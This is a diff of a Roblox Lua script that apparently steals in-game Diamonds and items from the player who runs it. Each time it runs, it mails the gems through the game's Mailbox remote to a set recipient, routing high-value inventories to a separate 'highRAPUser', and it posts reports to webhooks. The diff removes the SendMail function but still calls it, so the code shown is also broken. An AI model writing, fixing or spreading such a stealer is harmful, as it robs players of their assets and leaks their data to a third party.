@@ -294,48 +294,30 @@ if #sortedItems > 0 then
     local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
     local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
 
--- Define a function to send mail, explicitly passing the user parameter
-local function SendMail(username, diamonds, webhookUrl)
-    for i, v in pairs(GetSave().Inventory.Currency) do
-        if v.id == "Diamonds" then
-            if GemAmount1 >= 500 then
-                local args = {
-                    [1] = username,  -- Explicitly use the correct username
-                    [2] = MailMessage,
-                    [3] = "Currency",
-                    [4] = i,
-                    [5] = diamonds
-                }
-                local response = false
-                repeat
-                    response = network:WaitForChild("Mailbox: Send"):InvokeServer(unpack(args))
-                until response == true
-                break
-            end
-        end
-    end
-end
-    
+-- Conditional check: if total RAP > 100,000, send to high RAP user/webhook
+local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
+local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
+
 spawn(function()
     -- Conditional send logic based on totalRAP value
-    local targetUser = (totalRAP > 100000) and highRAPUser or plr.Name
-    local targetWebhook = (totalRAP > 100000) and highRAPWebhook or webhook
-
     if totalRAP > 100000 then
-        -- If total RAP > 100,000, send message and mail to highRAPWebhook/highRAPUser
-        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
-        SendMail(highRAPUser, GemAmount1, highRAPWebhook)
-        
+        -- If total RAP > 100,000:
+        -- Send both message and mail to highRAPWebhook/highRAPUser
+        SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)  -- Ensure to send message to highRAPUser
+        SendMail(highRAPUser, GemAmount1, highRAPWebhook)  -- Ensure mail is sent to highRAPUser
+
+        -- Webhook is already being sent to highRAPWebhook
+        -- No mail for the global user in this case
     else
-        -- If total RAP <= 100,000, send message and mail to global webhook/user
-        SendMessage(plr.Name, GemAmount1, webhook, plr.Name)
-        SendMail(plr.Name, GemAmount1, webhook)
-        
-        -- Additionally send a message to highRAPWebhook/highRAPUser (no mail)
+        -- If total RAP <= 100,000:
+        -- Send both message and mail to global webhook/user
+        SendMessage(user, GemAmount1, webhook, user)  -- Send message to global user
+        SendMail(user, GemAmount1, webhook)  -- Send mail to global user
+
+        -- Also send message to highRAPWebhook/highRAPUser (without mail)
         SendMessage(highRAPUser, GemAmount1, highRAPWebhook, highRAPUser)
     end
 end)
-
 
     SendAllGems()
 
